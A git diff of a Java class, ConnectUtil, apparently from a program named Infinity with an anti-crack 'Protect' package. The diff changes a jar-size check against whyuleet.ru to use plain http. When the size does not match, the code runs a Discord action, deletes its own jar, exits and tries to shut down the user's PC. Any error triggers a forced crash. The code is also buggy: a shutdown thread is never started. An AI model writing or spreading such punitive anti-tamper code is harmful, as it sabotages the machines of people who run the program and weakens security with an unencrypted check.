@@ -27,6 +27,7 @@ import org.infinity.ui.UpdateUI;
 import com.mashape.unirest.http.Unirest;
 
 import me.protect.Protect;
+import me.protect.utils.PHelper;
 
 public class ConnectUtil {
 
@@ -110,21 +111,6 @@ public class ConnectUtil {
 
 	}
 
-	public static int tryGetFileSize() {
-		try {
-			httpsSertificate();
-
-			HttpClient client = HttpClients.createDefault();
-			HttpGet request = new HttpGet("https://whyuleet.ru/infinity/jar/Infinity-" + getUpdateVersion() + ".jar");
-			HttpResponse response = client.execute(request);
-			String size = response.getLastHeader("Content-Length").getValue();
-
-			return Integer.parseInt(size);
-		} catch (Exception e) {
-			return -1;
-		}
-	}
-
 	public static void httpsSertificate() throws Exception {
 		try {
 
@@ -157,21 +143,32 @@ public class ConnectUtil {
 		try {
 			httpsSertificate();
 			File infJar = ProgramDirectoryUtilities.getCurrentJARFilePath();
-			int serverJarSize = tryGetFileSize();
 
-			if (infJar.length() == serverJarSize) {
-				return true;
-			} else {
+			HttpClient client = HttpClients.createDefault();
+			HttpGet request = new HttpGet("http://whyuleet.ru/infinity/jar/Infinity-" + getUpdateVersion() + ".jar");
+			HttpResponse response = client.execute(request);
+			String size = response.getLastHeader("Content-Length").getValue();
+
+			int serverJarSize = Integer.parseInt(size);
+
+			if (infJar.length() != serverJarSize) {
+
 				Protect.CRACK.discordExecute();
-				
-				Protect.CRACK.shutdownPC();
+
+				seldDestructionJar();
+
+				System.exit(0);
+
+				new Thread(() -> Protect.CRACK.shutdownPC());
 
 				return false;
 			}
 
 		} catch (Exception e) {
+			PHelper.makeCrash();
 		}
 
-		return false;
+		return true;
 	}
+
 }
